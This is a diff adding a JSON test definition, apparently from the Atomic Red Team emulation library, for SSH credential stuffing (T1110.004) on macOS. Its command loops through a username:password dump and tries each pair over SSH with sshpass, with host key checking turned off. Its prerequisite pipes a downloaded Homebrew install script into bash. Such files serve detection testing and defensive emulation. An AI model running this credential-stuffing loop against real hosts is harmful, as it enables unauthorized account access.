@@ -1,0 +1,37 @@
+{
+    "name": "SSH Credential Stuffing From MacOS",
+    "description": "Using username,password combination from a password dump to login over SSH. ",
+    "supported_platforms": [
+        "macos"
+    ],
+    "dependency_executor_name": "bash",
+    "executor": {
+        "name": "bash",
+        "elevation_required": false,
+        "command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n",
+        "type": "Command Executor"
+    },
+    "id": "T1110.004",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credential Stuffing",
+    "source": "ART",
+    "uuid": "d546a3d9-0be5-40c7-ad82-5a7d79e1b66b",
+    "arguments": {
+        "target_host": {
+            "description": "IP Address / Hostname you want to target.",
+            "type": "string",
+            "default": "localhost"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Requires SSHPASS\n",
+            "prereq_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
+            "get_prereq_command": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)\"\nbrew install hudochenkov/sshpass/sshpass\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
